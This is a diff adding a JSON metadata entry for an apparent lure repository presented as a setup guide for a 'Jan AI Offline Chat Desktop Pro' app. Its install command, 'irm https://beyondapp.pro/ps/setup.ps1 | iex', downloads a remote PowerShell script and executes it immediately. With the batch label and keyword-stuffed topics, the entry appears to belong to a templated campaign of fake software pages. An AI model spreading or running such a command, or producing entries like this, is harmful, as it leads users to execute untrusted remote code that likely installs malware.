@@ -1,0 +1,23 @@
+{
+  "repo": "Jan-AI-Offline-Chat-Desktop-Pro-Desktop-Setup-Guide",
+  "product": "Jan AI Offline Chat Desktop Pro Desktop Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "ai",
+  "topics": [
+    "jan-ai-offline-chat-desktop-pro-desktop",
+    "jan",
+    "offline",
+    "chat",
+    "desktop",
+    "pro",
+    "windows",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
